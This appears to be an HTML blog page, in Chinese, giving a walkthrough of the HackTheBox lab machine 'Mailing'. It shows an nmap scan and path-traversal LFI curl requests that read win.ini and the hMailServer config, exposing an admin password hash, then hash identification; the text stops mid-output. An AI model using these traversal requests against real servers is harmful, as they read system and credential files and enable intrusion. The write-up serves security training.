@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Mailing（説實話整個機器給我的印象都是作者希望我們玩猜猜樂） 0x1 Nmap Scan1234567891011121314151617181920212223">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Machine - Mailing">
+<meta property="og:url" content="https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="Recommand: Let’s Sign Up HTB Academy to get Higher level of knowledge :P 非常推薦: 想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P Mailing（説實話整個機器給我的印象都是作者希望我們玩猜猜樂） 0x1 Nmap Scan1234567891011121314151617181920212223">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505182219-pc977l0.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505182422-7xslv50.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505190812-ee74slu.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505190938-yfdr5hi.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505032918-ky5ctnu.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505191638-uyeqdc1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505192036-7aaif0y.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505192446-ct5h6zx.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505040424-f6gu491.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505040436-40m1y0k.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505040702-ux9izsr.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505193157-cy06fmg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505193719-a7i8ot4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505194216-tyu6tnn.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505194732-z01eqkz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505052635-6427fne.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505044257-n33e2z2.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240506013546-k0nx062.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240506013256-y9dhb1u.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240506014307-6rmi6w6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505201310-b28z3y1.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505201902-lcv3zf6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505202543-hptwqwu.png">
+<meta property="article:published_time" content="2024-05-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-08T00:15:18.041Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505182219-pc977l0.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HackTheBox - Machine - Mailing</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/05/12/2024-htb-machine/19-SolarLab/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/04/29/2024-htb-machine/17-Intuition/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&text=HackTheBox - Machine - Mailing"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&title=HackTheBox - Machine - Mailing"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&is_video=false&description=HackTheBox - Machine - Mailing"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Mailing&body=Check out this article: https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&title=HackTheBox - Machine - Mailing"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&title=HackTheBox - Machine - Mailing"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&title=HackTheBox - Machine - Mailing"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&title=HackTheBox - Machine - Mailing"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&name=HackTheBox - Machine - Mailing&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/05/05/2024-htb-machine/18-Mailing/&t=HackTheBox - Machine - Mailing"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        HackTheBox - Machine - Mailing
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-05-04T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-05-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p><strong>Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">Let’s Sign Up HTB Academy to get Higher level of knowledge :P</a></p>
+<p><strong>非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">想要變强嗎？ 快來加入 HTB Academy 獲得更高級的知識吧 :P</a></p>
+<h1 id="Mailing"><a href="#Mailing" class="headerlink" title="Mailing"></a>Mailing</h1><p>（説實話整個機器給我的印象都是作者希望我們玩猜猜樂）</p>
+<h2 id="0x1-Nmap-Scan"><a href="#0x1-Nmap-Scan" class="headerlink" title="0x1 Nmap Scan"></a>0x1 Nmap Scan</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line"></span><br><span class="line">[MAIL]</span><br><span class="line">25/tcp    open  smtp          syn-ack ttl 127 hMailServer smtpd</span><br><span class="line">| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP</span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">110/tcp   open  pop3          syn-ack ttl 127 hMailServer pop3d</span><br><span class="line">|_pop3-capabilities: UIDL TOP USER</span><br><span class="line">143/tcp   open  imap          syn-ack ttl 127 hMailServer imapd</span><br><span class="line">|_imap-capabilities: IMAP4 OK SORT CHILDREN RIGHTS=texkA0001 IMAP4rev1 CAPABILITY NAMESPACE ACL IDLE QUOTA completed</span><br><span class="line">465/tcp   open  ssl/smtp      syn-ack ttl 127 hMailServer smtpd</span><br><span class="line">587/tcp   open  smtp          syn-ack ttl 127 hMailServer smtpd</span><br><span class="line">993/tcp   open  ssl/imap      syn-ack ttl 127 hMailServer imapd</span><br><span class="line"></span><br><span class="line">[WEB]</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-title: Did not follow redirect to http://mailing.htb</span><br><span class="line"></span><br><span class="line">[RPC]</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">[WINRM]</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line"></span><br><span class="line">[UNKNOW]</span><br><span class="line">5040/tcp  open  unknown       syn-ack ttl 127</span><br><span class="line">7680/tcp  open  pando-pub?    syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">===================================================================================================================</span><br><span class="line">47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">50435/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| p2p-conficker:</span><br><span class="line">|   Checking <span class="keyword">for</span> Conficker.C or higher...</span><br><span class="line">|   Check 1 (port 31561/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 2 (port 53121/tcp): CLEAN (Timeout)</span><br><span class="line">|   Check 3 (port 13131/udp): CLEAN (Timeout)</span><br><span class="line">|   Check 4 (port 46818/udp): CLEAN (Timeout)</span><br><span class="line">|_  0/4 checks are positive: Host is CLEAN or ports are blocked</span><br><span class="line">| smb2-time:</span><br><span class="line">|   <span class="built_in">date</span>: 2024-05-04T19:10:21</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">|_clock-skew: 0s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 3) scan.</span><br><span class="line">Initiating NSE at 03:11</span><br><span class="line">Completed NSE at 03:11, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 3) scan.</span><br><span class="line">Initiating NSE at 03:11</span><br><span class="line">Completed NSE at 03:11, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 3 (of 3) scan.</span><br><span class="line">Initiating NSE at 03:11</span><br><span class="line">Completed NSE at 03:11, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 339.44 seconds</span><br><span class="line">           Raw packets sent: 131146 (5.770MB) | Rcvd: 247 (16.256KB)</span><br></pre></td></tr></table></figure>
+
+<p>整理如上，你可以看到他有一個 <code>hMailServer</code>​ 服務器在上面。</p>
+<h2 id="0x2-80-WEB-to-LFI"><a href="#0x2-80-WEB-to-LFI" class="headerlink" title="0x2 80 - WEB to LFI"></a>0x2 80 - WEB to LFI</h2><p>瀏覽器輸入該IP后，會自動跳轉到： <code>mailing.htb</code>​，隨手掃了一下子域名什麽也沒有。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505182219-pc977l0.png" alt="image">​</p>
+<p>他很清楚的告訴你，我的服務器就是 <code>hMailServer</code>​ ，而且還很貼心的放了 <code>hMailServer</code>​ 官網的鏈接。</p>
+<p>下面有一個 <code>Download Instructions</code>​ ，點開後是個PDF文件，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505182422-7xslv50.png" alt="image">​</p>
+<p>從PDF的圖片中可以看到，他發給了 maya ，但是看了下鏈接是 <code>http://mailing.htb/download.php?file=instructions.pdf</code>​，所以就測試一下有沒有LFI。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&#x27;http://mailing.htb/download.php?file=..\..\..\..\..\..\..\windows\win.ini&#x27;</span></span><br><span class="line">; <span class="keyword">for</span> 16-bit app support</span><br><span class="line">[fonts]</span><br><span class="line">[extensions]</span><br><span class="line">[mci extensions]</span><br><span class="line">[files]</span><br><span class="line">[Mail]</span><br><span class="line">MAPI=1</span><br></pre></td></tr></table></figure>
+
+<p>可以看到很明顯就是有，既然有了LFI那麽就可以嘗試獲取 <code>hMailServer</code>​ 的配置文件。</p>
+<h2 id="0x3-hMailServer​-config-to-get-admin-password"><a href="#0x3-hMailServer​-config-to-get-admin-password" class="headerlink" title="0x3 hMailServer​ config to get admin password"></a>0x3 <code>hMailServer</code>​ config to get admin password</h2><p>好了，那麽大問題來了，我既然有了LFI，那我要去哪裏讀取文件？</p>
+<p>由於不知道路徑，<code>hMailServer</code>​ 又是基於windows，所以我去官網下載了一個<code>hMailServer</code>​安裝到了windows的vm上。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505190812-ee74slu.png" alt="image">​</p>
+<p>安裝完之後在<code>C:\Program Files (x86)\hMailServer</code>​ 看到了路徑，由於我安裝的時候是隨便輸入的密碼，於是就在尋找密碼存放在哪個文件，</p>
+<p>打開了<code>Bin</code>​文件夾之後看到了密碼被一堆東西給加密了</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/05-m239lLBO2HAxCpH0-Mailing/image-20240505190938-yfdr5hi.png" alt="image">​</p>
+<p>這個時候就嘗試請求獲取服務器的配置文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ curl <span class="string">&#x27;http://mailing.htb/download.php?file=..\..\..\..\..\..\..\Program%20Files%20(x86)\hMailServer\Bin\hMailServer.INI&#x27;</span></span><br><span class="line">[Directories]</span><br><span class="line">ProgramFolder=C:\Program Files (x86)\hMailServer</span><br><span class="line">DatabaseFolder=C:\Program Files (x86)\hMailServer\Database</span><br><span class="line">DataFolder=C:\Program Files (x86)\hMailServer\Data</span><br><span class="line">LogFolder=C:\Program Files (x86)\hMailServer\Logs</span><br><span class="line">TempFolder=C:\Program Files (x86)\hMailServer\Temp</span><br><span class="line">EventFolder=C:\Program Files (x86)\hMailServer\Events</span><br><span class="line">[GUILanguages]</span><br><span class="line">ValidLanguages=english,swedish</span><br><span class="line">[Security]</span><br><span class="line">AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7</span><br><span class="line">[Database]</span><br><span class="line">Type=MSSQLCE</span><br><span class="line">Username=</span><br><span class="line">Password=0a9f8ad8bf896b501dde74f08efd7e4c</span><br><span class="line">PasswordEncryption=1</span><br><span class="line">Port=0</span><br><span class="line">Server=</span><br><span class="line">Database=hMailServer</span><br><span class="line">Internal=1</span><br></pre></td></tr></table></figure>
+
+<p>然後看看這個哈希是什麽：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ nth -t <span class="string">&#x27;841bb5acfa6779ae432fd7a4e6600ba7&#x27;</span>                       </span><br><span class="line"></span><br><span class="line">  _   _                           _____ _           _          _   _           _   </span><br><span class="line"> | \ | |                         |_   _| |         | |        | | | |         | |  </span><br><span class="line"> |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  </span><br><span class="line"> | . ` |/ _` | <span class="string">&#x27;_ ` _ \ / _ \______| | | &#x27;</span>_ \ / _` | __|______|  _  |/ _` / __| <span class="string">&#x27;_ \ </span></span><br><span class="line"><span class="string"> | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |</span></span><br><span class="line"><span class="string"> \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">https://twitter.com/bee_sec_san</span></span><br><span class="line"><span class="string">https://github.com/HashPals/Name-That-Hash </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">841bb5acfa6779ae432fd7a4e6600ba7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Most Likely </span></span><br><span class="line"><span class="string">MD5, HC: 0 JtR: raw-md5 Summary: Used for Linux Shadow files.</span></span><br><span class="line"><span class="string">MD4, HC: 900 JtR: raw-md4</span></span><br><span class="line"><span class="string">NTLM, HC: 1000 JtR: nt Summary: Often used in Windows Active Directory.</span></span><br><span class="line"><span class="string">Domain Cached Credentials, HC: 1100 JtR: mscach</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Least Likely</span></span><br><span class="line"><span class="string">Domain Cached Credentials 2, HC: 2100 JtR: mscach2 Double MD5, HC: 2600  Tiger-128,  Skein-256(128),  Skein-512(128),  Lotus Notes/Domino 5, HC: 8600 JtR: lotus5 md5(md5(md5($pass))), HC: </span></span><br><span class="line"><span class="string">3500 Summary: Hashcat mode is only supported in hashcat-legacy. md5(uppercase(md5($pass))), HC: 4300  